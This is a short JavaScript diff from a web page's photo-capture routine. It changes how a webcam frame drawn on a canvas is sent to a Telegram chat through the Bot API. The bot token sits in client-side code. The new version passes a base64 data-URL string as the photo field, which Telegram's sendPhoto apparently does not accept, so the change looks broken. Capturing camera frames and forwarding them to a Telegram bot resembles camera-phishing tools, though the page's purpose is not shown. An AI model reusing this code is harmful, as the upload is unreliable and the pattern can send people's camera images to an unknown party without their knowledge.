@@ -158,16 +158,14 @@ function capturePhoto() {
     video.style.display = "none";
     canvas.style.display = "block";
 
-    // Konversi gambar ke Blob
-    canvas.toBlob(blob => {
-        sendPhotoToTelegram(blob);
-    }, "image/jpeg");
+    let imageData = canvas.toDataURL("image/jpeg"); // Konversi ke base64
+    sendPhotoToTelegram(imageData);
 }
 
-function sendPhotoToTelegram(blob) {
+function sendPhotoToTelegram(imageData) {
     let formData = new FormData();
     formData.append("chat_id", chatId);
-    formData.append("photo", blob, "photo.jpg");
+    formData.append("photo", imageData);
 
     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
